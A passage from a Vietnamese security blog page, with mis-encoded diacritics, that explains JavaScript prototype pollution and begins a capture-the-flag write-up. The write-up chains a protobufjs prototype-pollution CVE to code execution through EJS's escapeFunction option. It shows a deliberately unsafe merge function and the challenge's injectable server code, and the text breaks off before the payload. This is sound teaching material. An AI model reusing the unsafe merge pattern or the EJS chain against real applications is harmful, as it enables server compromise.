<!DOCTYPE html>
<html lang="en-US">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <meta name="generator" content="VuePress 2.0.0-rc.18">
    <script>
      (function() {
        const userMode = localStorage.getItem('vuepress-reco-color-scheme') || 'auto';
        const systemDarkMode = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches;

        if (userMode === 'dark' || (userMode === 'auto' && systemDarkMode)) {
          document.documentElement.classList.toggle('dark', true);
        }
      })();
    </script>
    <link rel="icon" href="/alimi.ico"><title>Prototype Pollution | d0qbu's blog</title><meta name="description" content="d0qbu's blog to share something I knew">
    <link rel="preload" href="/assets/style-CLjLGmBa.css" as="style"><link rel="stylesheet" href="/assets/style-CLjLGmBa.css">
    <link rel="modulepreload" href="/assets/app-BJjiZhLy.js"><link rel="modulepreload" href="/assets/prototype-pollution-bios.html-QPgq_n3y.js">
    <link rel="prefetch" href="/assets/timeline.html-Dxk7sbyB.js" as="script"><link rel="prefetch" href="/assets/posts.html-svjq6049.js" as="script"><link rel="prefetch" href="/assets/friendship-link.html-DnusWWj3.js" as="script"><link rel="prefetch" href="/assets/1.html-D0ekpFwU.js" as="script"><link rel="prefetch" href="/assets/1.html-D-VJtKmR.js" as="script"><link rel="prefetch" href="/assets/1.html-DtlQzd4D.js" as="script"><link rel="prefetch" href="/assets/1.html-DxyjHmfe.js" as="script"><link rel="prefetch" href="/assets/1.html-mEFscRrH.js" as="script"><link rel="prefetch" href="/assets/1.html-K0Og4IjV.js" as="script"><link rel="prefetch" href="/assets/1.html-C56FgLwa.js" as="script"><link rel="prefetch" href="/assets/1.html-TWxB8BbY.js" as="script"><link rel="prefetch" href="/assets/1.html-gldDPc-a.js" as="script"><link rel="prefetch" href="/assets/1.html-CuKlQTZu.js" as="script"><link rel="prefetch" href="/assets/1.html-dCabBEr6.js" as="script"><link rel="prefetch" href="/assets/1.html-BzoJhmkV.js" as="script"><link rel="prefetch" href="/assets/1.html-3Zc5XUkc.js" as="script"><link rel="prefetch" href="/assets/index.html-XHz8wPa0.js" as="script"><link rel="prefetch" href="/assets/wannagame-freshman-2023.html-CsRvqhSO.js" as="script"><link rel="prefetch" href="/assets/CVE-2024-44902.html-T8TPcMVJ.js" as="script"><link rel="prefetch" href="/assets/cyber-apocalypse-2024.html-BFTdxU_i.js" as="script"><link rel="prefetch" href="/assets/greycatctf-2024.html-Bmf_YGFB.js" as="script"><link rel="prefetch" href="/assets/mysql-tcp.html--H7-qYyh.js" as="script"><link rel="prefetch" href="/assets/picoctf-2024.html-DUXLUr9W.js" as="script"><link rel="prefetch" href="/assets/404.html-C9_lKTdL.js" as="script"><link rel="prefetch" href="/assets/Valine.min-BDHOk_jE.js" as="script"><link rel="prefetch" href="/assets/giscus-aTimukGI-CpBH_6Jv.js" as="script"><link rel="prefetch" href="/assets/setupDevtools-7MC2TMWH-s98YujfD.js" as="script">
  </head>
  <body>
    <div id="app"><!--[--><div class="theme-container series--no show-catalog"><header class="navbar-container not-open"><div class="navbar-inner"><div class="site-brand nav-item"><!----><a href="/" class="site-name">d0qbu&#39;s blog</a></div><div class="nav-item navbar-links-wrapper" style=""><div><form class="search-box" role="search"><input type="search" autocomplete="off" spellcheck="false" value><!----></form></div><nav class="navbar-links"><!--[--><div class="navbar-links__item"><a href="/" class="link" aria-label="Home"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:;font-size:14px;"><!--[-->Home<!--]--></span></span><!--[--><!--]--></a></div><div class="navbar-links__item"><a href="/timeline.html" class="link" aria-label="Timeline"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:;font-size:14px;"><!--[-->Timeline<!--]--></span></span><!--[--><!--]--></a></div><div class="navbar-links__item"><a href="/categories/CTF/1.html" class="link" aria-label="Categories"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:;font-size:14px;"><!--[-->Categories<!--]--></span></span><!--[--><!--]--></a></div><!--]--><!----><span class="xicon-container btn-toggle-dark-mode btn--dark-mode navbar-links__item"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewbox="0 0 32 32" style="width:20px;height:20px;font-size:20px;color:;"><path d="M13.502 5.414a15.075 15.075 0 0 0 11.594 18.194a11.113 11.113 0 0 1-7.975 3.39c-.138 0-.278.005-.418 0a11.094 11.094 0 0 1-3.2-21.584M14.98 3a1.002 1.002 0 0 0-.175.016a13.096 13.096 0 0 0 1.825 25.981c.164.006.328 0 .49 0a13.072 13.072 0 0 0 10.703-5.555a1.01 1.01 0 0 0-.783-1.565A13.08 13.08 0 0 1 15.89 4.38A1.015 1.015 0 0 0 14.98 3z" fill="currentColor"></path></svg></span><ul class="social-links navbar-links__item"><!--[--><li class="social-item"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewbox="0 0 32 32" style="width:25px;height:25px;"><path d="M16 2a14 14 0 0 0-4.43 27.28c.7.13 1-.3 1-.67v-2.38c-3.89.84-4.71-1.88-4.71-1.88a3.71 3.71 0 0 0-1.62-2.05c-1.27-.86.1-.85.1-.85a2.94 2.94 0 0 1 2.14 1.45a3 3 0 0 0 4.08 1.16a2.93 2.93 0 0 1 .88-1.87c-3.1-.36-6.37-1.56-6.37-6.92a5.4 5.4 0 0 1 1.44-3.76a5 5 0 0 1 .14-3.7s1.17-.38 3.85 1.43a13.3 13.3 0 0 1 7 0c2.67-1.81 3.84-1.43 3.84-1.43a5 5 0 0 1 .14 3.7a5.4 5.4 0 0 1 1.44 3.76c0 5.38-3.27 6.56-6.39 6.91a3.33 3.33 0 0 1 .95 2.59v3.84c0 .46.25.81 1 .67A14 14 0 0 0 16 2z" fill-rule="evenodd" fill="currentColor"></path></svg></li><!--]--></ul></nav><span class="xicon-container btn-toggle-menus"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewbox="0 0 32 32" style="width:20px;height:20px;font-size:20px;color:;"><circle cx="16" cy="8" r="2" fill="currentColor"></circle><circle cx="16" cy="16" r="2" fill="currentColor"></circle><circle cx="16" cy="24" r="2" fill="currentColor"></circle></svg></span></div></div></header><!----><!----><!----><div class="theme-main" style=""><!----><!--[--><main class="page-container"><div class="page-content"><h1 class="page-title">Prototype Pollution</h1><div class="page-info"><span class="xicon-container left"><!--[--><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewbox="0 0 32 32" class="xicon-icon" style="width:18px;height:18px;font-size:18px;color:;"><path d="M16 4a5 5 0 1 1-5 5a5 5 0 0 1 5-5m0-2a7 7 0 1 0 7 7a7 7 0 0 0-7-7z" fill="currentColor"></path><path d="M26 30h-2v-5a5 5 0 0 0-5-5h-6a5 5 0 0 0-5 5v5H6v-5a7 7 0 0 1 7-7h6a7 7 0 0 1 7 7z" fill="currentColor"></path></svg><!--]--><span class="xicon-content" style="color:;font-size:14px;"><!--[-->d0qbu<!--]--></span></span><span class="xicon-container left"><!--[--><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewbox="0 0 32 32" class="xicon-icon" style="width:18px;height:18px;font-size:18px;color:;"><path d="M26 4h-4V2h-2v2h-8V2h-2v2H6c-1.1 0-2 .9-2 2v20c0 1.1.9 2 2 2h20c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 22H6V12h20v14zm0-16H6V6h4v2h2V6h8v2h2V6h4v4z" fill="currentColor"></path></svg><!--]--><span class="xicon-content" style="color:;font-size:14px;"><!--[-->2024-05-17<!--]--></span></span><span class="xicon-container left"><!--[--><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewbox="0 0 32 32" class="xicon-icon" style="width:18px;height:18px;font-size:18px;color:;"><path d="M11.17 6l3.42 3.41l.58.59H28v16H4V6h7.17m0-2H4a2 2 0 0 0-2 2v20a2 2 0 0 0 2 2h24a2 2 0 0 0 2-2V10a2 2 0 0 0-2-2H16l-3.41-3.41A2 2 0 0 0 11.17 4z" fill="currentColor"></path></svg><!--]--><span class="xicon-content" style="color:;font-size:14px;"><!--[--><!--[--><a href="/categories/Research/1.html" class="">Research</a><!--]--><!--]--></span></span><span class="xicon-container left"><!--[--><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewbox="0 0 32 32" class="xicon-icon" style="width:18px;height:18px;font-size:18px;color:;"><path d="M10 14a4 4 0 1 1 4-4a4.005 4.005 0 0 1-4 4zm0-6a2 2 0 1 0 1.998 2.004A2.002 2.002 0 0 0 10 8z" fill="currentColor"></path><path d="M16.644 29.415L2.586 15.354A2 2 0 0 1 2 13.941V4a2 2 0 0 1 2-2h9.941a2 2 0 0 1 1.414.586l14.06 14.058a2 2 0 0 1 0 2.828l-9.943 9.943a2 2 0 0 1-2.829 0zM4 4v9.942L18.058 28L28 18.058L13.942 4z" fill="currentColor"></path></svg><!--]--><span class="xicon-content" style="color:;font-size:14px;"><!--[--><!--[--><a href="/tags/Prototype-Pollution/1.html" class="">Prototype-Pollution</a><a href="/tags/RCE/1.html" class="">RCE</a><!--]--><!--]--></span></span><!----></div><div class="theme-reco-md-content"><div><h2 id="object-trong-javascript" tabindex="-1"><a class="header-anchor" href="#object-trong-javascript"><span>Object trong JavaScript</span></a></h2><p>Object trong Javascript l√† m·ªôt ki·ªÉu d·ªØ li·ªáu ƒë·∫∑c bi·ªát trong javascript, bao g·ªìm c√°c key:value, g·ªçi l√† property. Value c·ªßa object c√≥ th·ªÉ l∆∞u ƒë∆∞·ª£c nhi·ªÅu ki·ªÉu d·ªØ li·ªáu, bao g·ªìm c·∫£ m·ªôt object kh√°c hay function. <img src="/assets/prototype-pollution-bios-QzZf0BQi.png" alt="alt text"></p><p>C√≥ hai c√°ch th√¥ng th∆∞·ªùng ƒë·ªÉ truy c·∫≠p ƒë·∫øn c√°c property c·ªßa Object l√† Dot notation v√† Bracket Notation</p><ul><li><strong>Dot notation</strong>: object.properti</li><li><strong>Bracket notation</strong>: object[&quot;proerti&quot;]</li></ul><h3 id="object-prototypes" tabindex="-1"><a class="header-anchor" href="#object-prototypes"><span>Object Prototypes</span></a></h3><p>M·ªçi object trong JavaScript ƒë·ªÅu l√† instance c·ªßa <code>Object</code> n√™n ƒë·ªÅu ƒë∆∞·ª£c k·∫ø th·ª´a c√°c built-in property v√† method t·ª´ <code>Object.prototype</code>, g·ªçi l√† <strong>prototype</strong>. N√≥ l√† c∆° ch·∫ø c·ªßa Javascript Object ƒë·ªÉ k·∫ø th·ª´a c√°c t√≠nh nƒÉng c·ªßa nhau. V√≠ d·ª• nh∆∞ Object ·ªü tr√™n, d√π kh√¥ng ƒë∆∞·ª£c khai b√°o tr·ª±c ti·∫øp, nh∆∞ng v·∫´n c√≥ th·ªÉ truy c·∫≠p ƒë∆∞·ª£c property v√† method nh∆∞ <code>constructor</code>, <code>toString()</code>, <code>valueOf()</code>,...</p><p>Ta c√≥ th·ªÉ truy c·∫≠p ƒë·∫øn prototype c·ªßa m·ªôt object th√¥ng qua property <code>__proto__</code> ho·∫∑c <code>Object.getPrototypeOf()</code></p><h3 id="protoype-chain" tabindex="-1"><a class="header-anchor" href="#protoype-chain"><span>Protoype chain</span></a></h3><p>Javascript tri·ªÉn khai vi·ªác k·∫ø th·ª´a d·ª±a v√†o Object, m·ªói Object ƒë·ªÅu c√≥ m·ªôt li√™n k·∫øt ƒë·∫øn nh·ªØng Object kh√°c. M·ªói prototype c√≥ th·ªÉ ch·ª©a prototype kh√°c, g·ªçi l√† <strong>prototype chain</strong>, n√≥ c√≥ th·ªÉ k·∫ø th·ª´a cho ƒë·∫øn final chain l√† null prototype.</p><p>Khi ch√∫ng ta truy c·∫≠p ƒë·∫øn m·ªôt property c·ªßa Object, tr∆∞·ªõc ti√™n s·∫Ω ki·ªÉm tra c√°c property hi·ªán c√≥ c·ªßa n√≥, n·∫øu kh√¥ng c√≥ n√≥ s·∫Ω t√¨m ki·∫øm ti·∫øp trong prototype c·ªßa n√≥, v√† c·ª© ti·∫øp t·ª•c nh∆∞ th·∫ø cho ƒë·∫øn khi t√¨m th·∫•y ho·∫∑c ƒë·∫øn null prototype.</p><p>Ta c√≥ ƒëo·∫°n code nh∆∞ sau, Object s·∫Ω set property object = &quot;Object&quot; cho prototype, sau ƒë√≥ t·∫°o th√™m m·ªôt object m·ªõi, c√≥ property <code>obj</code>. V√† bi·∫øn <code>test</code> t·ª´ Object <code>obj</code><img src="/assets/prototype-pollution-bios-1-CfHHC5Cn.png" alt="alt text"></p><p>Khi ta truy c·∫≠p <code>test.obj</code>, n√≥ s·∫Ω t√¨m c√°c property c·ªßa test, v√¨ kh√¥ng c√≥ n√™n n√≥ s·∫Ω t√¨m trong prototype c·ªßa test, v√† t√¨m th·∫•y property <code>obj</code> c·ªßa prototype l√† t·ª´ bi·∫øn <code>obj</code>, n√™n k·∫øt qu·∫£ s·∫Ω l√† &quot;Object&quot;. T∆∞∆°ng t·ª±, khi ta truy c·∫≠p <code>test.object</code>, n√≥ s·∫Ω t√¨m trong property c·ªßa test, sau ƒë√≥ ƒë·∫øn <code>obj</code>, cu·ªëi c√πng t√¨m trong Object prototype, v√† t√¨m th·∫•y property <code>object</code> l√† &quot;Object&quot;.</p><h2 id="prototype-pollution" tabindex="-1"><a class="header-anchor" href="#prototype-pollution"><span>Prototype Pollution</span></a></h2><h3 id="so-luoc" tabindex="-1"><a class="header-anchor" href="#so-luoc"><span>S∆° l∆∞·ª£c</span></a></h3><p>T·ª´ vi·ªác c√≥ th·ªÉ g·ªçi ƒë·∫øn prototype c·ªßa object, kh√¥ng ch·ªâ access ƒë·∫øn property c·ªßa prototype, ta c√≤n c√≥ th·ªÉ c·∫≠p nh·∫≠t d·ªØ li·ªáu c·ªßa prototype, nh∆∞ v·∫≠y th√¨ t·∫•t c·∫£ c√°c object kh√°c k·∫ø th·ª´a t·ª´ prototype ƒë√≥ s·∫Ω b·ªã ·∫£nh h∆∞·ªüng theo.</p><p><img src="/assets/prototype-pollution-bios-2-BjPMotlW.png" alt="alt text"></p><p>ƒêi·ªÅu n√†y d·∫´n ƒë·∫øn Prototype Pollution, khi ta ch·ªânh s·ª≠a prototype c·ªßa Object, c√°c bi·∫øn kh√°c c≈©ng s·∫Ω b·ªã, d·∫´n t·ªõi vi·ªác khi truy c·∫≠p ƒë·∫øn m·ªôt property kh√¥ng t·ªìn t·∫°i trong object hi·ªán t·∫°i, n√≥ s·∫Ω t√¨m trong prototype v√† tr·∫£ v·ªÅ m·ªôt k·∫øt qu·∫£ kh√¥ng mong mu·ªën.</p><h3 id="nguyen-nhan" tabindex="-1"><a class="header-anchor" href="#nguyen-nhan"><span>Nguy√™n nh√¢n</span></a></h3><p>Nguy√™n nh√¢n th∆∞·ªùng ƒë·∫øn t·ª´ vi·ªác merge c√°c object theo ki·ªÉu ƒë·ªá quy v√† kh√¥ng ki·ªÉm tra k·ªπ c√†ng d·ªØ li·ªáu ƒë·∫ßu v√†o, ho·∫∑c t·ª´ vi·ªác parse d·ªØ li·ªáu t·ª´ ngu·ªìn kh√¥ng tin c·∫≠y.</p><div class="language-javascript line-numbers-mode" data-highlighter="prismjs" data-ext="js" data-title="js"><pre><code><span class="line"><span class="token keyword">function</span> <span class="token function">merge</span><span class="token punctuation">(</span><span class="token parameter">src<span class="token punctuation">,</span> dst</span><span class="token punctuation">)</span> <span class="token punctuation">{</span></span>
<span class="line">    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> key <span class="token keyword">in</span> src<span class="token punctuation">)</span> <span class="token punctuation">{</span></span>
<span class="line">        <span class="token keyword">if</span> <span class="token punctuation">(</span>key <span class="token keyword">in</span> src <span class="token operator">&amp;&amp;</span> key <span class="token keyword">in</span> dst<span class="token punctuation">)</span> <span class="token punctuation">{</span></span>
<span class="line">            <span class="token function">merge</span><span class="token punctuation">(</span>dst<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">,</span> src<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line">        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span></span>
<span class="line">            dst<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">=</span> src<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">;</span></span>
<span class="line">        <span class="token punctuation">}</span></span>
<span class="line">    <span class="token punctuation">}</span></span>
<span class="line">    <span class="token keyword">return</span> dst<span class="token punctuation">;</span></span>
<span class="line"><span class="token punctuation">}</span></span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="challenge" tabindex="-1"><a class="header-anchor" href="#challenge"><span>Challenge:</span></a></h2><h3 id="bi0s-required-note" tabindex="-1"><a class="header-anchor" href="#bi0s-required-note"><span>bi0s/required note</span></a></h3><div class="custom-container info"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="9"></circle><path d="M12 8h.01"></path><path d="M11 12h1v4h1"></path></g></svg><p class="custom-container-title">INFO</p><p>Every CTF requires at least one overly complicated notes app.</p><p><a href="https://r3kapig-not1on.notion.site/bi0sCTF-2024-Jeopardy-2132609e35d74137935046fbcb62ff49" target="_blank" rel="noopener noreferrer"><code>üìÅ required_note.zip</code><span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a></p><blockquote><p>Author: Z_Pacifist</p></blockquote></div><p><img src="/assets/prototype-pollution-bios-4-aGCIIYOm.png" alt="alt text"></p><ul><li>Website cho ph√©p ta t·∫°o ra c√°c note v√† l∆∞u tr·ªØ. Ngo√†i ra th√¨ c√≥ th·ªÉ customise c√°c field v·ªõi protobuf <img src="/assets/prototype-pollution-bios-5-B5d8y9UL.png" alt="alt text"></li><li>C√≥ m·ªôt note ch·ª©a flag ƒë∆∞·ª£c t·∫°o s·∫µn v·ªõi t√™n ƒë∆∞·ª£c generate t·ª´ h√†m <code>Math.random()</code> bao g·ªìm 16 k√≠ t·ª± [a-z0-9]</li></ul><h4 id="overview" tabindex="-1"><a class="header-anchor" href="#overview"><span>Overview</span></a></h4><p>Khi t√πy ch·ªânh settings, ta s·∫Ω g·ª≠i POST request ƒë·∫øn server <img src="/assets/prototype-pollution-bios-6-CkKX1tqA.png" alt="alt text"> H√†m sau ƒë√≥ ƒë∆∞·ª£c x·ª≠ l√≠ nh∆∞ sau</p><div class="language-javascript line-numbers-mode" data-highlighter="prismjs" data-ext="js" data-title="js"><pre><code><span class="line">app<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">&quot;/customise&quot;</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span></span>
<span class="line">  <span class="token keyword">try</span> <span class="token punctuation">{</span></span>
<span class="line">    <span class="token keyword">const</span> <span class="token punctuation">{</span> data <span class="token punctuation">}</span> <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">;</span></span>
<span class="line">    <span class="token keyword">let</span> author <span class="token operator">=</span> data<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">&quot;author&quot;</span><span class="token punctuation">]</span><span class="token punctuation">;</span></span>
<span class="line">    <span class="token keyword">let</span> title <span class="token operator">=</span> data<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">&quot;title&quot;</span><span class="token punctuation">]</span><span class="token punctuation">;</span></span>
<span class="line"></span>
<span class="line">    <span class="token keyword">let</span> protoContents <span class="token operator">=</span> fs</span>
<span class="line">      <span class="token punctuation">.</span><span class="token function">readFileSync</span><span class="token punctuation">(</span><span class="token string">&quot;./settings.proto&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;utf-8&quot;</span><span class="token punctuation">)</span></span>
<span class="line">      <span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">&quot;\n&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line"></span>
<span class="line">    <span class="token keyword">if</span> <span class="token punctuation">(</span>author<span class="token punctuation">)</span> <span class="token punctuation">{</span></span>
<span class="line">      protoContents<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">  </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>author<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string"> string author = 3 [default=&quot;user&quot;];</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span></span>
<span class="line">    <span class="token punctuation">}</span></span>
<span class="line"></span>
<span class="line">    <span class="token keyword">if</span> <span class="token punctuation">(</span>title<span class="token punctuation">)</span> <span class="token punctuation">{</span></span>
<span class="line">      protoContents<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">  </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>title<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string"> string title = 1 [default=&quot;user&quot;];</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span></span>
<span class="line">    <span class="token punctuation">}</span></span>
<span class="line"></span>
<span class="line">    fs<span class="token punctuation">.</span><span class="token function">writeFileSync</span><span class="token punctuation">(</span><span class="token string">&quot;./settings.proto&quot;</span><span class="token punctuation">,</span> protoContents<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string">&quot;\n&quot;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">&quot;utf-8&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line"></span>
<span class="line">    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">{</span> <span class="token literal-property property">Message</span><span class="token operator">:</span> <span class="token string">&quot;Settings changed&quot;</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line">  <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>error<span class="token punctuation">)</span> <span class="token punctuation">{</span></span>
<span class="line">    console<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span>error<span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line">    res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">{</span> <span class="token literal-property property">Message</span><span class="token operator">:</span> <span class="token string">&quot;Internal server error&quot;</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line">  <span class="token punctuation">}</span></span>
<span class="line"><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>Server s·∫Ω l·∫•y <code>author</code> v√† <code>title</code> d·ª±a v√†o user input, ghi ƒë√® v√†o file <code>settings.proto</code>. Trong khi server s·∫Ω x·ª≠ l√≠ file protobuf th√¥ng qua th∆∞ vi·ªán <a href="https://www.npmjs.com/package/protobufjs" target="_blank" rel="noopener noreferrer">protobufjs<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a> nh∆∞ng l·∫°i kh√¥ng s·ª≠ d·ª•ng latest version n√™n m√¨nh th·∫•y kh√° s√∫. <img src="/assets/prototype-pollution-bios-7-BKbyKvqi.png" alt="alt text"> Sau khi research th√¨ m√¨nh ph√°t hi·ªán ra c√≥ <a href="https://www.code-intelligence.com/blog/cve-protobufjs-prototype-pollution-cve-2023-36665" target="_blank" rel="noopener noreferrer">CVE<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a> c·ªßa version n√†y li√™n quan t·ªõi <strong>Prototype Pollution</strong>.</p><p>C·ª• th·ªÉ, POST payload l√™n <code>/customise</code> ƒë·ªÉ truy·ªÅn payload v√†o file <code>settings.protobuf</code>, sau khi t·∫°o m·ªôt note m·ªõi, server s·∫Ω parse t·ª´ file settings v√† b·ªã Prototype pollution. <img src="/assets/prototype-pollution-bios-8-B9_18Fb9.png" alt="alt text"></p><p>Nh∆∞ v·∫≠y th√¨ ta c√≥ th·ªÉ t·∫≠n d·ª•ng Prototype Pollution ƒë·ªÉ khai th√°c b√†i n√†y.</p><h4 id="solution" tabindex="-1"><a class="header-anchor" href="#solution"><span>Solution</span></a></h4><h5 id="rce-voi-ejs" tabindex="-1"><a class="header-anchor" href="#rce-voi-ejs"><span>RCE v·ªõi EJS</span></a></h5><p>Ejs v3.1.9 c≈©ng c√≥ <a href="https://github.com/mde/ejs/issues/735" target="_blank" rel="noopener noreferrer">vuln SSTI<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a>. Ki·ªÉm tra th·ª≠ compile prototype th√¨ th·∫•y ƒëa s·ªë c√°c options ƒë·ªÅu c√≥ ƒë∆∞·ª£c <code>_JS_IDENTIFIER</code> test tr∆∞·ªõc khi x·ª≠ l√≠, tr·ª´ <code>escapeFn</code><img src="/assets/prototype-pollution-bios-9-bjK5B5jb.png" alt="alt text"><code>escapeFn</code> l·∫°i ƒë∆∞·ª£c g√°n t·ª´ <code>opts.escapeFunction</code><img src="/assets/prototype-pollution-bios-10-A0dv5veB.png" alt="alt text"> V√¨ ƒëo·∫°n code ban ƒë·∫ßu kh√¥ng g√°n options <code>escapeFunction</code> n√™n ta c√≥ th·ªÉ ghi ƒë√® v√†o ƒë√¢y v·ªõi Prototype Pollution. <code>escapeFn</code> ch·ªâ ƒë∆∞·ª£c th√™m v√†o khi <code>opts.client</code> l√† truthy value. Ta ch·ªâ c·∫ßn t·∫≠n d·ª•ng v√† g√°n cho n√≥ gi√° tr·ªã true, escapeFn s·∫Ω ƒë∆∞·ª£c th√™m v√†o.</p><details class="custom-container details"><summary class="custom-container-title">eval</summary><p>D√≤ng 24 l√† d√≤ng ta th√™m v√†o cho <code>escapeFn</code> ƒë·ªÉ c√≥ th·ªÉ 